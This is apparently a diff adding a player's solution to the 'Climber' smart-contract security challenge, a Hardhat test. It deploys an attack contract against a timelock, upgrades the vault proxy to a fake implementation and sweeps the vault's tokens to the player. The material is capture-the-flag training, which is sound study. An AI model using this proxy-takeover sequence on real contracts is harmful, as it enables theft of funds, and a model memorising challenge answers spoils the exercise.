@@ -1,10 +1,11 @@
-const { ethers, upgrades } = require('hardhat');
+const { ethers, upgrades } = require('hardhat'); 
 const { expect } = require('chai');
-const { setBalance } = require('@nomicfoundation/hardhat-network-helpers');
+const { setBalance, time } = require('@nomicfoundation/hardhat-network-helpers');
 
 describe('[Challenge] Climber', function () {
     let deployer, proposer, sweeper, player;
     let timelock, vault, token;
+    let attack;
 
     const VAULT_TOKEN_BALANCE = 10000000n * 10n ** 18n;
     const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
@@ -57,7 +58,14 @@ describe('[Challenge] Climber', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const AttackFactory = await ethers.getContractFactory('AttackC', player);
+        attack = await AttackFactory.connect(player).deploy(vault.address,timelock.address,player.address,token.address);
+
+        await attack.connect(player).kek();
+
+        FIFactory = await ethers.getContractFactory('FakeImplementation', player);        
+        const vaultFI = await upgrades.upgradeProxy(vault, FIFactory);
+        await vaultFI.connect(player).kekSweep(token.address,player.address);
     });
 
     after(async function () {
